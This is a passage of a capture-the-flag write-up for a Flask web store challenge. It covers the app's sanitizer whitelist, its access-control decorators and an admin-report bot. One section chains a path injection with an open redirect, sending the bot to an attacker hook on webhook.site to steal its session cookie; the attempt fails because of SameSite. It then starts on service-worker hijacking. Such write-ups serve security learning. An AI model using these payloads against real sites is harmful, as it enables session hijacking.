+</span></span><span style="display:flex;"><span>            sanitized_args[key] <span style="color:#f92672">=</span> bleach<span style="color:#f92672">.</span>clean(value, tags<span style="color:#f92672">=</span>allowedTags, attributes<span style="color:#f92672">=</span>allowedAttributes)
+</span></span><span style="display:flex;"><span>        request<span style="color:#f92672">.</span>args <span style="color:#f92672">=</span> sanitized_args
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        sanitized_form <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>            sanitized_form[key] <span style="color:#f92672">=</span> bleach<span style="color:#f92672">.</span>clean(value, tags<span style="color:#f92672">=</span>allowedTags, attributes<span style="color:#f92672">=</span>allowedAttributes)
+</span></span><span style="display:flex;"><span>        request<span style="color:#f92672">.</span>form <span style="color:#f92672">=</span> sanitized_form
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> f(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> decorator
+</span></span></code></pre></div><p>Notice that <strong>cookies</strong> and <strong>headers</strong> are not sanitized, so if we find a cookie/header DOM sink we might use it to bypass sanitization.</p>
+<p>The whitelist itself is interesting:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>allowedAttributes <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;a&#39;</span>: (<span style="color:#e6db74">&#39;href&#39;</span>, <span style="color:#e6db74">&#39;name&#39;</span>, <span style="color:#e6db74">&#39;target&#39;</span>, <span style="color:#e6db74">&#39;title&#39;</span>, <span style="color:#e6db74">&#39;id&#39;</span>, <span style="color:#e6db74">&#39;rel&#39;</span>)}
+</span></span><span style="display:flex;"><span>allowedTags <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;h1&#39;</span>, <span style="color:#e6db74">&#39;h2&#39;</span>, <span style="color:#e6db74">&#39;h3&#39;</span>, <span style="color:#e6db74">&#39;strong&#39;</span>, <span style="color:#e6db74">&#39;em&#39;</span>, <span style="color:#e6db74">&#39;p&#39;</span>, <span style="color:#e6db74">&#39;ul&#39;</span>, <span style="color:#e6db74">&#39;ol&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;li&#39;</span>, <span style="color:#e6db74">&#39;br&#39;</span>, <span style="color:#e6db74">&#39;sub&#39;</span>, <span style="color:#e6db74">&#39;sup&#39;</span>, <span style="color:#e6db74">&#39;hr&#39;</span>, <span style="color:#e6db74">&#39;style&#39;</span>, <span style="color:#e6db74">&#39;span&#39;</span>
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>Most notably, we have access to a <code>style</code> tag, and we have access to a bunch of attributes within an <code>a</code> tag. Let&rsquo;s keep these in mind.</p>
+<h3 id="evaluating-our-privileges">Evaluating Our Privileges<a href="#evaluating-our-privileges" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Based on our understanding of the middleware used to enforce security controls, we can see that after logging in and email verification we have access to all routes except those protected by <code>@isInternal</code> and <code>@IsAdmin</code>.</p>
+<p>Understanding what we can and cannot access in an application helps us narrow down our attack surface.</p>
+<p>Let&rsquo;s evaluate our privileges in more detail. Looking at our routes, we currently can access these endpoints:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># ~~~~~~~~~~~~~~~~~~~~</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># blueprints/routes.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ~~~~~~~~~~~~~~~~~~~~</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">signIn</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#39;/verify&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#39;/settings&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">settings</span>(decodedToken):
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#39;/home&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isVerified</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">home</span>(decodedToken):
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#39;/product/&lt;productID&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isVerified</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">products</span>(decodedToken, productID):
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#39;/product/addProduct&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isVerified</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isInternal</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addProduct</span>(decodedToken):
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ~~~~~~~~~~~~~~~~~</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># blueprints/api.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ~~~~~~~~~~~~~~~~~</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@api.route</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sanitizeInput</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">signIn</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@api.route</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sanitizeInput</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">signUp</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@api.route</span>(<span style="color:#e6db74">&#39;/profile&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@antiCSRF</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sanitizeInput</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">updateUser</span>(decodedToken):
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@api.route</span>(<span style="color:#e6db74">&#39;/sendVerification&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sanitizeInput</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sendVerification</span>(decodedToken):
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@api.route</span>(<span style="color:#e6db74">&#39;/report&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isVerified</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@antiCSRF</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sanitizeInput</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reportProduct</span>(decodedToken):
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>Meanwhile, we can <strong>not</strong> access these two pages and their corresponding API endpoints:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># ~~~~~~~~~~~~~~~~~~~~</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># blueprints/routes.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ~~~~~~~~~~~~~~~~~~~~</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#39;/product/addProduct&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isVerified</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isInternal</span> <span style="color:#f92672">&lt;---</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addProduct</span>(decodedToken):
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> getUser(decodedToken<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;id&#39;</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;addProduct.html&#39;</span>, user<span style="color:#f92672">=</span>user, antiCSRFToken<span style="color:#f92672">=</span>decodedToken<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;antiCSRFToken&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#39;/admin/contracts&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isVerified</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isInternal</span> <span style="color:#f92672">&lt;---</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAdmin</span> <span style="color:#f92672">&lt;---</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addContract</span>(decodedToken):
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> getUser(decodedToken<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;id&#39;</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;addContracts.html&#39;</span>, user<span style="color:#f92672">=</span>user, antiCSRFToken<span style="color:#f92672">=</span>decodedToken<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;antiCSRFToken&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ~~~~~~~~~~~~~~~~~</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># blueprints/api.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ~~~~~~~~~~~~~~~~~</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@api.route</span>(<span style="color:#e6db74">&#39;/addItem&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isVerified</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isInternal</span> <span style="color:#f92672">&lt;---</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@antiCSRF</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sanitizeInput</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addItem</span>(decodedToken):
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@api.route</span>(<span style="color:#e6db74">&#39;/addContract&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isVerified</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isInternal</span> <span style="color:#f92672">&lt;---</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAdmin</span> <span style="color:#f92672">&lt;---</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@antiCSRF</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sanitizeInput</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addContract</span>(decodedToken):
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>To summarize our results thus far: we can register an account and log on to it, we can then view our profile, trigger email verification and verify ourselves, and once verified, we can report items displayed on the store to the &ldquo;team&rdquo;.</p>
+<p>Meanwhile, we <strong>cannot</strong> add new products to the store, nor upload a contract because the former requires <code>@isInternal</code> while the latter requires both <code>@IsInternal</code> and <code>@isAdmin</code>.</p>
+<p>Our next step is to try using what we have to obtain what we do not have with the ultimate goal of achieving <strong>Remote Code Execution</strong>.</p>
+<h2 id="chapter-4-attempts-down-the-road">Chapter 4: Attempts down the Road<a href="#chapter-4-attempts-down-the-road" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>In the previous chapter, we enumerated our building blocks - the things within our control - let us see what can we do with these.</p>
+<p>An invaluable skill to develop as a researcher, is what I call &ldquo;the hypothesis generator&rdquo;. It&rsquo;s a mental habit that provides you with an endless stream of theories and ideas to explore. You must be always trying something, reasoning about what you see or looking for new ways to leverage your current findings.</p>
+<p>The cycles goes as follows:</p>
+<ol>
+<li>Identify building blocks (Done)</li>
+<li>Hypothesize an attack</li>
+<li>Test hypothesis</li>
+<li>Repeat till success</li>
+</ol>
+<blockquote>
+<p>In this chapter, I will briefly list some of the hypotheses I tested. You can skip to the next chapter for the main solution path; although I think it is equally important to know the many failed attempts, especially why they failed and under what conditions would they succeed.</p>
+</blockquote>
+<h3 id="session-hijacking">Session Hijacking<a href="#session-hijacking" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Remember the <strong>Report Item</strong> functionality we have seen earlier? It looked very promising, let&rsquo;s see its backend logic:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@api.route</span>(<span style="color:#e6db74">&#39;/report&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isVerified</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@antiCSRF</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sanitizeInput</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reportProduct</span>(decodedToken):
+</span></span><span style="display:flex;"><span>    productID <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;id&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> productID:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> response(<span style="color:#e6db74">&#39;All fields are required!&#39;</span>), <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    adminUser <span style="color:#f92672">=</span> getUser(<span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    params <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;productID&#39;</span>: productID, <span style="color:#e6db74">&#39;email&#39;</span>: adminUser[<span style="color:#e6db74">&#39;email&#39;</span>], <span style="color:#e6db74">&#39;password&#39;</span>: adminUser[<span style="color:#e6db74">&#39;password&#39;</span>]}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://127.0.0.1:8082/visit&#39;</span>, params<span style="color:#f92672">=</span>params)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response(<span style="color:#e6db74">&#39;Report submitted! Our team will review it&#39;</span>)
+</span></span></code></pre></div><p>Whoa! Admin credentials are ever-so-easily handed to the bot along with the reported <code>productID</code>.</p>
+<p>Let&rsquo;s see what is the bot doing with these credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>	client <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Chrome(options<span style="color:#f92672">=</span>chrome_options)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    client<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://127.0.0.1:1337/challenge/&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>    client<span style="color:#f92672">.</span>find_element(By<span style="color:#f92672">.</span>ID, <span style="color:#e6db74">&#34;email&#34;</span>)<span style="color:#f92672">.</span>send_keys(email)
+</span></span><span style="display:flex;"><span>    client<span style="color:#f92672">.</span>find_element(By<span style="color:#f92672">.</span>ID, <span style="color:#e6db74">&#34;password&#34;</span>)<span style="color:#f92672">.</span>send_keys(password)
+</span></span><span style="display:flex;"><span>    client<span style="color:#f92672">.</span>execute_script(<span style="color:#e6db74">&#34;document.getElementById(&#39;login-btn&#39;).click()&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>    client<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://127.0.0.1:1337/challenge/home&#34;</span>)
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>    client<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://127.0.0.1:1337/challenge/product/</span><span style="color:#e6db74">{</span>productID<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">120</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    client<span style="color:#f92672">.</span>quit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">8082</span>)
+</span></span></code></pre></div><p>Reviewing the code, we spot a <strong>Path Injection</strong> vulnerability. <code>productID</code> is directly appended to the bot&rsquo;s path without validation.</p>
+<p>We can leverage a payload like <code>../home</code> to send the bot to <code>/challenge/home</code> instead.</p>
+<p>Remember the <strong>Open Redirect</strong> we found earlier? We can leverage that to send the bot to <em>any</em> URL we want!</p>
+<p>Let&rsquo;s <em>chain</em> these two vulnerabilities to send the bot to our attacker-controlled site:</p>
+<pre tabindex="0"><code>../external?url=https://www.webhook.site/REDACTED
+</code></pre><p>Few seconds pass, then we receive a request on our hook, but&hellip; no cookies within!</p>
+<p>Reviewing the login, cookie-granting endpoint, we spot our oversight:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>res<span style="color:#f92672">.</span>set_cookie(<span style="color:#e6db74">&#39;session&#39;</span>, token, expires<span style="color:#f92672">=</span>datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>utcnow() <span style="color:#f92672">+</span> datetime<span style="color:#f92672">.</span>timedelta(minutes<span style="color:#f92672">=</span><span style="color:#ae81ff">360</span>), httponly<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, samesite<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Strict&#39;</span>)
+</span></span></code></pre></div><p>The cookie has <code>SameSite: Strict</code> which instructs the browser to never pass the cookie to different origins, understandably so.</p>
+<p><strong>References:</strong></p>
+<ul>
+<li><a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions">https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions</a></li>
+<li><a href="https://fetch.spec.whatwg.org/#concept-request-client">https://fetch.spec.whatwg.org/#concept-request-client</a></li>
+<li><a href="https://fetch.spec.whatwg.org/#ref-for-concept-http-fetch%E2%91%A4">https://fetch.spec.whatwg.org/#ref-for-concept-http-fetch%E2%91%A4</a></li>
+<li><a href="https://security.stackexchange.com/questions/223473/for-samesite-cookie-with-subdomains-what-are-considered-the-same-site">https://security.stackexchange.com/questions/223473/for-samesite-cookie-with-subdomains-what-are-considered-the-same-site</a></li>
+<li><a href="https://publicsuffix.org/learn/">https://publicsuffix.org/learn/</a></li>
+</ul>
+<h3 id="service-worker-hijacking-via-dom-clobbering">Service Worker Hijacking via DOM Clobbering<a href="#service-worker-hijacking-via-dom-clobbering" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>As we saw previously, the application makes use of Service Workers.</p>
+<p>Searching through the code, we see they are loaded through the <code>templates/_layout.html</code> template:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">$</span>(window).<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;load&#34;</span>, <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#34;serviceWorker&#34;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">navigator</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">host</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;#serviceWorkerHost&#34;</span>).<span style="color:#a6e22e">text</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">version</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;#serviceWorkerVersion&#34;</span>).<span style="color:#a6e22e">text</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">serviceWorker</span>
+</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">register</span>(<span style="color:#e6db74">`/static/js/sw.js?host=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">host</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;version=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">version</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">scope</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/challenge/&#34;</span>,
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">registration</span>) =&gt; {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Service Worker registered:&#34;</span>, <span style="color:#a6e22e">registration</span>);
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>        .<span style="color:#66d9ef">catch</span>((<span style="color:#a6e22e">error</span>) =&gt; {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Service Worker registration failed:&#34;</span>, <span style="color:#a6e22e">error</span>);
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;serviceWorkerHost&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display: none;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  https://storage.googleapis.com
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;serviceWorkerVersion&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display: none;&#34;</span>&gt;6.5.3&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><p>The Service Worker is registered at <code>/static/js/sw.js</code>, let&rsquo;s check that file out:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">searchParams</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">host</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;host&#34;</span>);
